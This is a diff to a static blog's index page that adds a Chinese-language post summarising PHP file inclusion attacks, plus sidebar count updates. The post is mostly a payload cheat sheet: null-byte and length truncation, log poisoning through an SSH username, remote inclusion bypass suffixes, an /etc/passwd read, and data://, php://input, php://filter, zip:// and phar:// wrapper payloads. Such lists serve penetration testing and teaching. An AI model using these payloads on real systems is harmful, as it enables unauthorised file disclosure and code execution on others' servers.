@@ -229,6 +229,209 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/05/PHP-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B0%8F%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zrools">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zrools">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/05/PHP-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B0%8F%E7%BB%93/" itemprop="url">PHP 文件包含小结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-05T09:09:00+08:00">
+                2020-03-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><h3 id="require"><a href="#require" class="headerlink" title="require()"></a>require()</h3><p>生成致命错误 (E_COMPILE_ERROR) 并停止脚本。</p>
+<h3 id="include"><a href="#include" class="headerlink" title="include()"></a>include()</h3><p>只生成警告（E_WARNING），脚本会继续。</p>
+<h3 id="require-once-amp-include-once"><a href="#require-once-amp-include-once" class="headerlink" title="require_once() &amp; include_once()"></a>require_once() &amp; include_once()</h3><p>如前面已包含，忽略本次，用于嵌套包含，避免函数重定义，变量重新赋值等。</p>
+<h2 id="包含文件"><a href="#包含文件" class="headerlink" title="包含文件"></a>包含文件</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><ul>
+<li><code>%00</code>截断： PHP版本 &lt; 5.3.4， <code>magic_quotes_gpc=Off</code></li>
+<li>长度截断： PHP版本 &lt; php 5.2.8，Windows为256字节、Linux为4096字节</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include($filename.&quot;.php&quot;);</span><br><span class="line"></span><br><span class="line">?file&#x3D;phpinfo.txt%00</span><br><span class="line"></span><br><span class="line">?file&#x3D;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;. ... .&#x2F;.&#x2F;.&#x2F;shell.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="包含session文件"><a href="#包含session文件" class="headerlink" title="包含session文件"></a>包含session文件</h3><ul>
+<li>session文件路径： phpinfo()</li>
+<li>session.use_strict_mode：<code>session id</code>使用方式，0 - 客户端，1 - 服务端，缺省为0</li>
+<li>phpstudy的<code>sessionId</code>存储目录默认在<code>tmp/tmp</code></li>
+</ul>
+<h3 id="包含资源文件"><a href="#包含资源文件" class="headerlink" title="包含资源文件"></a>包含资源文件</h3><ul>
+<li>.jpg/.png …</li>
+<li>.rar/.zip/.tar/.tar.gz/.7z …</li>
+<li>.txt/.doc/.xls/.docx</li>
+<li>.mp4/.mp3 …</li>
+<li>…</li>
+</ul>
+<h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><ul>
+<li>中间件日志：access.log、error.log …</li>
+<li>FTP日志： /var/log/vsftpd.log （用户名输入一句话）</li>
+<li>SSH日志： /var/log/auth.log</li>
+<li>MySQL日志： /var/log/mysql/error.log</li>
+<li>Web应用日志</li>
+<li>…</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh &quot;&lt;?php phpinfo(); ?&gt;&quot;@192.168.1.1</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen &#x3D; On  默认为 On</span><br><span class="line"></span><br><span class="line">allow_url_include &#x3D; On  &gt;&#x3D; 5.2 默认为 Off</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>问号绕过： <code>http://xxx/abc.txt?</code></li>
+<li>井号绕过： <code>http://xxx/abc.txt%23</code></li>
+<li>空格绕过： <code>http://xxx/abc.txt%20</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include($filename.&quot;.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><ul>
+<li>file://</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;file:&#x2F;&#x2F;.&#x2F;1.txt</span><br><span class="line"></span><br><span class="line">?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>php://filter</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;filename</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>data://</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP版本 &gt;&#x3D; 5.2</span><br><span class="line"></span><br><span class="line">allow_url_fopen: On</span><br><span class="line"></span><br><span class="line">allow_url_include: On</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?filename&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br><span class="line">?filename&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOyA&#x2F;Pgo&#x3D;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>zip://</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP版本 &gt;&#x3D; 5.3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;C:&#x2F;uploads&#x2F;phpinfo.zip%23phpinfo.php</span><br><span class="line"></span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;.&#x2F;uploads&#x2F;file.jpg%23phpcode.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>bzip2://</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP版本 &gt;&#x3D; 5.3.0</span><br><span class="line"></span><br><span class="line">xxx.bz2 格式</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?file&#x3D;compress.bzip2:&#x2F;&#x2F;C:&#x2F;uploads&#x2F;file.jpg</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>zlib://</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP版本 &gt;&#x3D; 5.3.0</span><br><span class="line"></span><br><span class="line">xxx.gz 格式</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?file&#x3D;compress.zlib:&#x2F;&#x2F;C:&#x2F;uploads&#x2F;file.jpg</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>php://input</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include &#x3D; On</span><br><span class="line"></span><br><span class="line">enctype&#x3D;multipart&#x2F;form-data 时无效</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;input</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>php://filter</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;1.txt</span><br><span class="line"></span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php</span><br><span class="line"></span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>phar://</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP版本 &gt;&#x3D; 5.3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;phpinfo.zip&#x2F;phpinfo.txt</span><br><span class="line"></span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;C:&#x2F;uploads&#x2F;phpinfo.zip&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/MySQL-%E6%B8%97%E9%80%8F%E5%B0%8F%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -903,7 +1106,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -916,7 +1119,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
